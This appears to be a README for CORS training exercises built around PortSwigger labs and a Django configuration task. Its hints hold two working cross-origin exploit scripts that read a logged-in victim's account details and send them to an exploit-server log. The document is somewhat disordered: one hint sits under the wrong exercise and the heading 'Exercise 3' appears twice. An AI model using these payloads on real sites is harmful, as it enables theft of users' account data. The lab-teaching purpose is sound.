# Cross-Origin-Resource-Sharing
Cross-Origin Resource Sharing (CORS) is an HTTP-header based mechanism that allows a server to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading resources.

## Getting Started
PortSwigger account is required [PortSwigger](https://portswigger.net/users/register)  
Necessary tools: [Burt Suite](https://portswigger.net/burp/communitydownload)

## Exercise 1
CORS vulnerability with basic origin reflection
> [Exercise_1](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

<details>
  <summary>Hint</summary>
    
    #This code my help you access logs  
    #In your browser, go to the exploit server and enter the following HTML, replacing $url with your unique lab URL  
  
    <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','$url/accountDetails',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
          location='/log?key='+this.responseText;
      };
    </script>
  
</details>

## Exercise 2
CORS vulnerability with trusted null origin  
> [Exercise_2](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)

## Exercise 3
CORS configuration in Django
Downloads BAWIM.tar.gz and BAWIM2.tar.gz
BAWIM.tar.gz contains a webserver that shows some images. 
BAWIM2.tar.gz contains a webserver that shows images from BAWIM.tar.gz
Your task is to allow webserver BAWIM2 to access files from BAWIM. 



<details>
  <summary>Hint</summary>  
    
    #This code my help you access logs  
    #In your browser, go to the exploit server and enter the following HTML, replacing $url with the URL for your unique lab URL and $exploit-server-url with the exploit server URL  
  
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
      srcdoc="<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','$url/accountDetails',true);
      req.withCredentials = true;
      req.send();
      function reqListener() {
        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
      };
      </script>">
    </iframe>  
  
</details>

## Exercise 3
![alt text](https://github.com/JJast/Cross-Origin-Resource-Sharing/blob/main/i1.png?raw=true)
![alt text](https://github.com/JJast/Cross-Origin-Resource-Sharing/blob/main/i2.png?raw=true)


